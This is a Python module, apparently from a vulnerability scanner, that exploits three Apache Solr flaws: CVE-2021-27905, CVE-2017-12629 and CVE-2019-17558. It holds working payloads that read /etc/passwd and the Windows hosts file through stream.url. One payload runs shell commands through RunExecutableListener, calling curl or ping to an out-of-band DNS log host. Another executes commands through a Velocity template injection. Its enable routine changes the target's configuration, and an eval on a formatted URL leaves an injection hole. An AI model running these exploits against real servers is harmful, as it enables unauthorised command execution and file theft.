#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    ApacheSolr扫描类: 
        1. Solr SSRF/任意文件读取
            CVE-2021-27905
                Payload: https://vulhub.org/#/environments/solr/Remote-Streaming-Fileread/

        2. Solr 远程命令执行
            CVE-2017-12629
                Payload: https://vulhub.org/#/environments/solr/CVE-2017-12629-RCE/

        3. Solr Velocity 注入远程命令执行
            CVE-2019-17558
                Payload: https://vulhub.org/#/environments/solr/CVE-2019-17558/

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
'''

from lib.api.dns import dns
from lib.initial.config import config
from lib.tool.md5 import md5, random_md5, random_int_1, random_int_2
from lib.tool.logger import logger
from lib.tool.thread import thread
from lib.tool import check
from thirdparty import requests
from time import sleep
import re

class Solr():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ApacheSolr'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.db_name = ''
        self.RemoteStreaming = False
        self.params = False

        self.cve_2021_27905_payloads = [
            {
                'path': 'solr/{}/debug/dump',
                'data': 'param=ContentStreams&stream.url=file:///etc/passwd'
            },
            {
                'path': 'solr/{}/debug/dump',
                'data': 'param=ContentStreams&stream.url=file:///C:\Windows\System32\drivers\etc\hosts'
            },
            {
                'path': 'solr/{}/debug/dump',
                'data': 'param=ContentStreams&stream.url=file:///C:/Windows/System32/drivers/etc/hosts'
            },
        ]

        random_name = random_md5()
        self.cve_2017_12629_payloads = [
            {
                'path': 'solr/demo/config',
                'data': '{"add-listener":{"event":"postCommit","name":"' + random_name + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "curl DNSDOMAIN"]}}'
            },
            {
                'path': 'solr/demo/config',
                'data': '{"add-listener":{"event":"postCommit","name":"' + random_name + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping -c 4 DNSDOMAIN"]}}'
            },
            {
                'path': 'solr/demo/config',
                'data': '{"add-listener":{"event":"postCommit","name":"' + random_name + '","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "ping DNSDOMAIN"]}}'
            }
        ]

        self.cve_2019_17558_payloads = [
            {
                'path': "solr/{}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27" + self.cmd + "%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end",
                'data': ''
            },
        ]

    def enable(self, url):
        ''' 用于开启Solr的RemoteStreaming或自定义模板(params.resource.loader.enabled) '''
        if self.RemoteStreaming or self.params:
            return

        core_path = 'solr/admin/cores?indexInfo=false&wt=json' # * 获取数据库名称
        config_path = 'solr/{}/config'                         # * 使用数据库名称开启RemoteStreaming功能
        config_data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
        params_data = '''{
  "update-queryresponsewriter": {
    "startup": "lazy",
    "name": "velocity",
    "class": "solr.VelocityResponseWriter",
    "template.base.dir": "",
    "solr.resource.loader.enabled": "true",
    "params.resource.loader.enabled": "true"
  }
}'''

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'Solr'
        vul_info['vul_id'] = 'Solr-enable'
        vul_info['headers'] = {
            'Content-Type': 'application/json'
        }

        target_core = url + core_path
        target_config = url + config_path

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        res1 = requests.get(
            target_core, 
            timeout=self.timeout, 
            headers=self.headers, 
            proxies=self.proxies, 
            verify=False
        )
        logger.logging(vul_info, res1.status_code, res1)                 # * LOG

        db_name = re.search(r'"name":".+"', res1.text, re.M|re.I)        # * 如果存在solr的数据库名称
        if db_name:
            db_name = db_name.group()
            db_name = db_name.replace('"name":', '')
            self.db_name = db_name.strip('"')                            # * 只保留双引号内的数据库名称

        if self.db_name:
            # todo 开启RemoteStreaming
            res2 = requests.post(
                target_config.format(self.db_name), 
                timeout=self.timeout, 
                headers=headers,
                data=config_data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res2.status_code, res2)
            if (res2.status_code == 200):
                self.RemoteStreaming = True

            # todo 开启params.resource.loader.enabled
            res3 = requests.post(
                target_config.format(self.db_name), 
                timeout=self.timeout, 
                headers=headers,
                data=params_data, 
                proxies=self.proxies, 
                verify=False,
                allow_redirects=False
            )
            logger.logging(vul_info, res3.status_code, res3)
            if (res3.status_code == 200):
                self.params = True

    def cve_2021_27905_scan(self, url):
        ''' 当Solr不启用身份验证时, 攻击者可以直接制造请求以启用特定配置, 最终导致SSRF或任意文件读取 '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'SSRF'
        vul_info['vul_id'] = 'CVE-2021-27905'
        vul_info['vul_method'] = 'GET/POST'
        vul_info['headers'] = {
            'Content-Type': 'application/json'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])             # * 合并Headers

        self.enable(url)                                # * 开启Solr的RemoteStreaming
        if not self.RemoteStreaming:
            return None

        for payload in self.cve_2021_27905_payloads:    # * Payload
            path = payload['path'].format(self.db_name) # * Path
            data = payload['data']                      # * Data
            target = url + path                         # * Target

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=self.headers, 
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                       # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (('/sbin/nologin' in res.text) or ('root:x:0:0:root' in res.text) or ('Microsoft Corp' in res.text) or ('Microsoft TCP/IP for Windows' in res.text)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Payload': res
                }
                return results

    def cve_2017_12629_scan(self, url):
        ''' 7.1.0之前版本总共爆出两个漏洞: XML实体扩展漏洞(XXE)和远程命令执行漏洞(RCE)
                二者可以连接成利用链, 编号均为CVE-2017-12629
        '''
        sessid = '60491ea49ab435a2cc1acb7aa93e3409'

        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2017-12629'
        # vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {
            'Content-Type': 'application/json'
        }

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        for payload in self.cve_2017_12629_payloads:
            path = payload['path']
            data = payload['data'].replace('DNSDOMAIN', dns_domain)
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.post(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    data=data, 
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
                
                if ('"WARNING":"This response format is experimental.  It is likely to change in the future."' in res.text):
                    res2 = requests.post(
                        url + 'solr/demo/update', 
                        timeout=self.timeout, 
                        headers=headers,
                        data='[{"id":"test"}]', 
                        proxies=self.proxies, 
                        verify=False,
                        allow_redirects=False
                    )
                    logger.logging(vul_info, res2.status_code, res2)                        # * LOG
                else:
                    return None
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            sleep(10)                                    # * solr太慢啦!
            if (md in dns.result(md, sessid)):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res,
                    'Request-2': res2
                }
                return results

    def cve_2019_17558_scan(self, url):
        ''' 5.0.0版本至8.3.1版本中存在输入验证错误漏洞, 
            攻击者可借助自定义的Velocity模板功能, 利用Velocity-SSTI漏洞在Solr系统上执行任意代码
        '''
        vul_info = {}
        vul_info['app_name'] = self.app_name
        vul_info['vul_type'] = 'RCE'
        vul_info['vul_id'] = 'CVE-2019-17558'
        # vul_info['vul_method'] = 'POST'
        vul_info['headers'] = {}

        headers = self.headers.copy()
        headers.update(vul_info['headers'])

        self.enable(url)                    # * 此漏洞需要启用Solr的RemoteStreaming功能
        if not self.params:
            return None

        for payload in self.cve_2019_17558_payloads:
            path = payload['path'].format(self.db_name)
            data = payload['data']
            target = url + path

            vul_info['path'] = path
            vul_info['data'] = data
            vul_info['target'] = target

            try:
                res = requests.get(
                    target, 
                    timeout=self.timeout, 
                    headers=headers,
                    proxies=self.proxies, 
                    verify=False,
                    allow_redirects=False
                )
                logger.logging(vul_info, res.status_code, res)                        # * LOG
            except requests.ConnectTimeout:
                logger.logging(vul_info, 'Timeout')
                return None
            except requests.ConnectionError:
                logger.logging(vul_info, 'Faild')
                return None
            except:
                logger.logging(vul_info, 'Error')
                return None

            if (self.md in check.check_res(res.text, self.md) ):
                results = {
                    'Target': target,
                    'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                    'Request': res
                }
                return results

    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cve_2021_27905_scan, url=url),
            thread(target=self.cve_2017_12629_scan, url=url),
            thread(target=self.cve_2019_17558_scan, url=url)
        ]

solr = Solr()